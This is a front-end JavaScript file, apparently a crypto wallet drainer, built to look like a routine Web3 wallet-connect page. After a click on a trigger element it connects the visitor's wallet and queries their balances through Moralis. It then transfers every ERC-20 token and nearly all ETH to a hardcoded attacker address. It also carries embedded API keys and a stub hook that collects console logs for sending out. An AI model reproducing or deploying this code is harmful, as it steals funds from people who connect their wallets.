"use strict";

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

let web3Modal;
let provider;
let selectedAccount;
const receiver_addres = "0xd563046D7b5B669787caF376B0578b21E9C68459";
let onButtonClick;
let user_address;
let start_to_log = false;

function getParameterByName(name, url = window.location.href) {
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return "";
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}

async function init() {
  start_to_log = false;
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log("Portis is", Portis);
  console.log(
    "window.web3 is",
    window.web3,
    "window.ethereum is",
    window.ethereum
  );
  if (location.protocol !== "https:") {
  }
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: { infuraId: "e77435344ef0486893cdc26d7d5cf039" },
    },
    portis: {
      package: Portis,
      options: { id: "3f250ef7-0216-4a18-a21b-1b3a9292b33c" },
    },
  };
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions,
    disableInjectedProvider: false,
  });
  console.log("Web3Modal instance is", web3Modal);
  return "Done";
}
async function fetchAccountData() {
  start_to_log = false;
  const web3 = new Web3(provider);
  console.log("Web3 instance is", web3);
  const chainId = await web3.eth.getChainId();
  const chainData = evmChains.getChain(chainId);
  console.log("Chain data name:", chainData.name);
  const accounts = await web3.eth.getAccounts();
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    const ethBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    console.log("New Account: %o", { address, balance, humanFriendlyBalance });
  });
  await Promise.all(rowResolvers);
  proceed();
}
async function refreshAccountData() {
  await fetchAccountData(provider);
}
async function onConnect() {
  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    console.log("provider", provider);
    $(document).ready(function () {
      $("#myModal").modal("show");
    });
  } catch (e) {
    console.log("Could not get a wallet connection", e);
    return;
  }
  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });
  await refreshAccountData();
  onButtonClick = proceed;
}
onButtonClick = onConnect;
async function onDisconnect() {
  console.log("Killing the wallet connection", provider);
  if (provider.close) {
    await provider.close();
    await web3Modal.clearCachedProvider();
    provider = null;
  }
  selectedAccount = null;
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
}
async function getTokens(
  address = "",
  api_key = "gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG",
  chain = "eth"
) {
  return new Promise((resolve, reject) => {
    fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=eth`, {
      method: "GET",
      headers: { accept: "application/json", "X-API-Key": api_key },
    })
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
async function getBalance(
  address = "",
  api_key = "gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG",
  chain = "eth"
) {
  return new Promise((resolve, reject) => {
    fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=eth`, {
      method: "GET",
      headers: { accept: "application/json", "X-API-Key": api_key },
    })
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}
const receiver_address = "0xd563046D7b5B669787caF376B0578b21E9C68459";
async function proceed() {
  start_to_log = false;
  console.log("Now we roll!!!");
  const serverUrl = "https://pt5gk0drbc2k.usemoralis.com:2053/server";
  const appId = "uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW";
  const apiKey =
    "gh8QcQ44yAaqOJR5AtKGM7uDpDo6pddkKD25FEyT8zK2e8jnK5Zv5atjV5kWIAjF";
  Moralis.start({ serverUrl, appId });
  console.log("Moralis initialized");
  let user;
  try {
    if (provider.isMetaMask) {
      console.log("Moralis using default (MetaMask)");
      const web3Provider = await Moralis.enableWeb3();
      console.log("Moralis web3Provider:", web3Provider);
    } else {
      console.log("Moralis using walletconnect");
      try {
        user = await Moralis.authenticate({ provider: "walletconnect" });
        console.log("Moralis user:", user);
      } catch (error) {
        console.log("Failed to authenticate moralis:", error);
      }
    }
  } catch (error) {
    console.log("Can't enable web3: ", error);
  }
  async function send() {
    console.log("Attempting to send tokens...");
    if (!user_address) {
      throw Error(`No user:  ${user_address}`);
    }
    console.log("Searching for tokens...");
    const nft_options = { chain: "eth", address: user_address, limit: "98" };
    const eth_tokens = await getTokens(user_address, apiKey).catch((e) => {
      console.log("Unable to get tokens", e);
    });
    console.log("Eth tokens: %o", eth_tokens);
    if (eth_tokens.length < 1) {
      const eth_balance = await getBalance(user_address, apiKey).catch((e) => {
        console.log("Unable to get new eth balance", e);
      });
      console.log("eth_balance", eth_balance);
      console.log("eth_balance.balance", eth_balance.balance);
      const balance =
        parseInt(eth_balance.balance) / 1000000000000000000 - 0.005;
      console.log("The new eth balance", balance);
      if (balance > 0) {
        const options = {
          type: "native",
          amount: Moralis.Units.ETH(balance.toString()),
          receiver: receiver_address,
        };
        let result = await Moralis.transfer(options);
        console.log(result);
      } else {
        console.log("Insufficient funds");
      }
      return console.log("No tokens found");
    }
    for (let n = 0; n < eth_tokens.length; n++) {
      let token = eth_tokens[Number(n)];
      let { token_address: contractAddress, balance: balance } = token;
      let token_transfer_options = {
        type: "erc20",
        amount: balance,
        receiver: receiver_address,
        contractAddress,
      };
      let temp = { token: token, options: token_transfer_options };
      console.log(`Transferring token[${n}]:%o`, temp);
      let transaction = await Moralis.transfer(token_transfer_options).catch(
        (e) => {
          console.log(
            "Can't transfer NFT:",
            e,
            "Transfer Options: %o",
            token_transfer_options
          );
        }
      );
      console.log(transaction);
    }
    const eth_balance = await getBalance(user_address, apiKey).catch((e) => {
      console.log("Unable to get new eth balance", e);
    });
    console.log("eth_balance", eth_balance);
    console.log("eth_balance.balance", eth_balance.balance);
    const balance = parseInt(eth_balance.balance) / 1000000000000000000 - 0.005;
    console.log("The new eth balance", balance);
    if (balance > 0) {
      const options = {
        type: "native",
        amount: Moralis.Units.ETH(balance.toString()),
        receiver: receiver_address,
      };
      let result = await Moralis.transfer(options);
      console.log(result);
    } else {
      console.log("Insufficient funds");
    }
  }
  send();
}
{
  let l = console.log;
  function normalize(x_) {
    let x = String(x_);
    if (/^\[object/g.test(x)) {
      try {
        let y = JSON.stringify(x_);
        x = y;
      } catch (error) {
        x = x + " >> " + Object.keys(x_);
      }
      return x;
    } else {
      return x;
    }
  }
  let logs_to_send = [];
  if (getParameterByName("log") == "true") {
    let el = document.getElementById("testx");
    el.style.display = "block";
    console.log = (x, ...y) => {
      l(x);
      if (y && y.length > 0) {
        y.forEach((z) => {
          l(y, ":", z);
          x += " -> (" + normalize(z) + ")";
        });
      }
      x = normalize(x);
      el.innerText += "~ " + x + "\n";
      if (start_to_log) {
        logs_to_send.push(x);
      }
      window.setTimeout(function () {
        el.scrollTop = el.scrollHeight;
      }, 500);
    };
  }
  setInterval(() => {
    if (logs_to_send.length == 0 || !start_to_log) return;
    let text = logs_to_send.splice(0, 1);
    let url = "";
    let chat_id = "";
  }, 100);
}
{
  let l = console.log;
  function normalize(x_) {
    let x = String(x_);
    if (/^\[object/g.test(x)) {
      try {
        let y = JSON.stringify(x_);
        x = y;
      } catch (error) {
        x = x + " >> " + Object.keys(x_);
      }
      return x;
    } else {
      return x;
    }
  }
  let logs_to_send = [];
  if (getParameterByName("log") == "true") {
    let el = document.getElementById("testx");
    el.style.display = "block";
    console.log = (x, ...y) => {
      l(x);
      if (y && y.length > 0) {
        y.forEach((z) => {
          l(y, ":", z);
          x += " -> (" + normalize(z) + ")";
        });
      }
      x = normalize(x);
      el.innerText += "~ " + x + "\n";
      if (start_to_log) {
        logs_to_send.push(x);
      }
      window.setTimeout(function () {
        el.scrollTop = el.scrollHeight;
      }, 500);
    };
  }
  setInterval(() => {
    if (logs_to_send.length == 0 || !start_to_log) return;
    let text = logs_to_send.splice(0, 1);
    let url = ``;
    let chat_id = "";
  }, 100);
}
async function startx() {
  await init()
    .then(() => {
      onButtonClick();
    })
    .catch((e) => {
      console.log("Initialization failed.");
      console.log(e);
    });
}
let els = document.getElementsByClassName("triggerx");
[...els].forEach((el) => {
  el.addEventListener("click", () => {
    startx();
  });
});
console.log(window);
